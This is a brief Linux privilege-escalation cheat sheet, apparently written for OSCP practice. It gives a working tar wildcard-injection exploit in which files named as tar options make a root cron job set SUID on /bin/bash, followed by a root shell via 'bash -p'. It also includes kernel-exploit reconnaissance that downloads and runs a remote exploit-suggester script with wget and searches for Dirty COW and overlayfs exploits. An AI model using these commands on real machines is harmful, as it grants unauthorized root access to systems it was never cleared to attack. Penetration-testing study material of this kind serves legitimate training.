
> WILD CARD TAR 
```sh

*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *

# 1. Create the payload script
echo 'chmod u+s /bin/bash' > shell.sh
chmod +x shell.sh

# 2. Create the exploit files that tar will interpret as options
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

/bin/bash -p
```

>kernel exploit
```sh
# 2.6.xx  Very common in OSCP machines
    
#3.2.x - 3.19.x Also frequently seen
    
# 4.4.x Sometimes with specific vulnerabilities
# Look for: 2.6.22 < 3.9
# Check kernel version
uname -a
cat /proc/version

# Download and run
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh

searchsploit kernel 3.13
searchsploit dirty cow
searchsploit overlayfs
```